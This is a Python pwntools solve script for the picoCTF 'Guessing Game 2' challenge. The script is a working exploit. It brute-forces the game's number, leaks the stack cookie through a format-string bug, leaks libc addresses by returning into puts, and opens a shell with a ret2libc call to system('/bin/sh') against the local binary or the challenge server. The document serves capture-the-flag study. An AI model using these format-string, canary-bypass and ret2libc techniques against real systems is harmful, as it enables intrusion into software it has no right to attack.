#!/usr/bin/env python3

"""
WhatTheFuzz's submission for the picoCTF challenge Guessing Game 2.

This script can be used in the following manner:
python3 ./solve.py <REMOTE/LOCAL>

Args:
    param1: LOCAL will operate locally on the user's machine.
            REMOTE will connect to the CTF webserver and grab the flag.
            If no parameter is specified, the program will default to LOCAL.

Returns:
    The flag to solve the challenge.
"""

from pwn import *

exe = ELF("./vuln")

context.binary = exe
context.log_level = 'info'
context.terminal = 'gnome-terminal'
context.endian = 'little'

GDB_SCRIPT = '''
file ./vuln
'''

def guess_address_of_rand(io):
    '''As opposed to calling `rand()` as in guessing-game-1, this program
    simply defines the random number as the address of rand() % 4096 + 1.
    Since we won't know where the address is located, lets just guess.
    This may change every time, so we don't want to restart the program.
    This will return the answer to the question and leave the program open.
    '''

    log.info('Guessing the address of rand...')
    # Try each number in the range -4096 to 4096.
    for i in range(-4096, 4096):
        io.sendlineafter(b'What number would you like to guess?', str(i).encode())

        io.recvline() # Move past the newline.
        response = io.recvline()
        if response in b'Congrats! You win! Your prize is this print statement!\n':
            return i

    # If we get here, we didn't find the answer.
    raise Exception("Couldn't find the address of random % 4096 + 1.")


def find_input(io):
    '''This looks complicated, but it's not. Essentially, we are feeding known
    input (via the call to cyclic) to the program. We then check the output of
    the string that the program returns. It will have our known string in it.
    Since we will provide it |%x 39 times, it will also print out 39 addresses
    on the stack. One of those values will be our input. This is important to
    find because it gives us a relative read or write at any address.

    Returns an int representing the offset of our input on the stack.
    '''
    max_len_input = 39

    # Count the output.
    # We give the program a known string. We can then examine the output for
    # where the string appears.
    # We only need four bytes worth of characters to match on.
    known_string = cyclic(4)
    # |%x is the format string for hexadecimal with a pipe character
    # prefixing each address.
    name = known_string + max_len_input * b'|%x'


    io.sendlineafter(b'Name? ', name)
    stack_offset = 0
    # Find the offset of the string we sent.
    line = io.recvline_contains(b'Congrats: ')
    for i in line.split(b'|'):
        stack_offset += 1
        try:
            # Stop walking the stack when we find the string we sent.
            if binascii.unhexlify(i) == known_string:
                break
        except:
            pass

    # We intentionally subtract one because the very first characters
    # printed will be our input before we have walked up the stack
    return stack_offset - 1

def get_stack_cookie(io):
    '''Get the stack cookie from the program.
    '''

    # At address 0x080487e9, the instruction moves what is pointed to be
    # $EBP - 0xC into $ECX. This value is then compared to the stored stack
    # cookie. We need to find this value and ensure our payload loads it at
    # the correct offset such that the comparison will succeed.

    # Set a breakpoint for the printf instruction in `win` to see where our
    # input ends up on the stack.
    # br * 0x080487ce

    # Enter the random number and continue the program.

    # Send input 'aaaa%p%p%p' to the program. We should hit the breakpoint.
    # Observe where our input is located on the stack:
    # esp 0xffffc8c0 —▸ 0xffffc8dc ◂— 'aaaa%p%p%p'

    # Search for the return address of the function `win`.
    # pwndbg> search -t pointer 0x0804888c
    # [stack]         0xffffcaec 0x804888c

    # First guess the number again.
    guess_address_of_rand(io)

    offset = 135

    # Send the format string.
    io.sendlineafter(b'Name? ', f'%{offset}$p'.encode())
    line = io.recvline_contains(b'Congrats: ')

    # Separate the address from the rest of the output.
    try:
        cookie = int(line.split(b'Congrats: ')[1], 16)
    except:
        raise Exception("Couldn't find the cookie.")
    return cookie

def get_cookie_offset():
    # Send cyclic pattern to the program.
    # cyclic(5000)
    # Set a breakpoint at 0x80487ec
    # Observe the value moved into $eax. This is the offset in our
    # payload that we must write the stack cookie.
    return 512

def get_ret_addr_offset():
    '''Find where in our payload we control the return address.
    Return the offset as an integer.
    '''
    # The same thing as above, but this time, we need to add the stack cookie
    # to the end of the payload to make sure it's the same.
    # So it'll look like:
    # payload = 'A' * cookie_offset + p64(cookie) + cyclic(5000)
    return 528


def leak_libc(io, cookie, cookie_offset, ret_addr_offset, function_to_leak):
    '''Leak an offset inside libc by calling the puts@PLT with the argument
    of puts@GOT. This will print out the address of where the dynamic linker
    loaded puts in memory. Knowing this, we can later figure out how far away
    `system` is.
    '''

    log.info(f'The address of {function_to_leak}@GOT is: {hex(exe.got[function_to_leak])}')
    #log.info(f'The address of win is: {hex(exe.symbols["win"])}')

    payload = fit({
        cookie_offset: p32(cookie),
        ret_addr_offset: p32(exe.plt['puts']),
        ret_addr_offset + 4: p32(exe.symbols['do_stuff']),
        ret_addr_offset + 8: p32(exe.got[function_to_leak]),
    })

    # Send the random number and the payload.
    guess_address_of_rand(io)
    io.sendlineafter(b'Name?', payload)
    io.recvline()   # Move past congrats.
    io.recvline()   # Move past the newline
    line = u32(io.recv(4)) # [0:4] # Get the address (first four bytes)
    return line
    # Separate the address from the rest of the output.




def conn():
    '''Establish the connection to the process, local or remote.
    '''

    if args.get('REMOTE'):
        io = remote('jupiter.challenges.picoctf.org', 13775)

    else:
        io = process([exe.path])

    return io

def pwn(rand_addr, libc_addrs):
    '''Return an open shell to get the flag.'''
    with conn() as io:

        # Get the stack cookie.
        cookie = get_stack_cookie(io)

        io.sendlineafter(b'What number would you like to guess?', str(rand_addr).encode())

        libc_addrs['system'] = libc_addrs['puts'] - 0x2a650 # See the writeup for how we got this.
        libc_addrs['str_bin_sh'] = libc_addrs['puts'] + 0x11442f # See the writeup for how we got this.


        payload = fit({
            get_cookie_offset(): p32(cookie),
            get_ret_addr_offset(): p32(libc_addrs['system']),
            get_ret_addr_offset() + 4: p32(exe.symbols['do_stuff']),
            get_ret_addr_offset() + 8: p32(libc_addrs['str_bin_sh']),
        })
        io.sendlineafter(b'Name', payload)
        io.interactive()




def main():
    '''Return the flag.
    '''

    with conn() as io:

        # Get the address of rand % 4096 + 1
        rand_addr = guess_address_of_rand(io)
        log.info("Value of rand: {}".format(rand_addr))

        # Figure out where our input is on the stack.
        stack_offset = find_input(io)
        log.info('Found input on stack at offset: {}'.format(stack_offset))

        # Figure out the offset at which we overwrite the stack cookie.
        cookie_offset = get_cookie_offset()
        log.info(f'The offset at which we overwrite the stack cookie is: {cookie_offset}')

    # Leak some addresses from libc to figure out where system is.
    libc_addrs = {}
    for i in ['puts', 'rand']: # Leak these functions.
        with conn() as io:
            # Get the value of the stack cookie.
            cookie = get_stack_cookie(io)
            log.debug(f'The value of the stack cookie is: {hex(cookie)}')

            # Figure out the offset to the return address.
            ret_addr_offset = get_ret_addr_offset()
            log.debug(f'The offset at which we overwrite the return address is: {ret_addr_offset}')

            # Leak the address of libc.
            addr_in_libc = leak_libc(io, cookie, cookie_offset, ret_addr_offset, i)
            log.info(f'The address of {i} in libc is: {hex(addr_in_libc)}')

            libc_addrs[i] = addr_in_libc

    pwn(rand_addr, libc_addrs)


if __name__ == '__main__':
    main()
    #pwn(1953)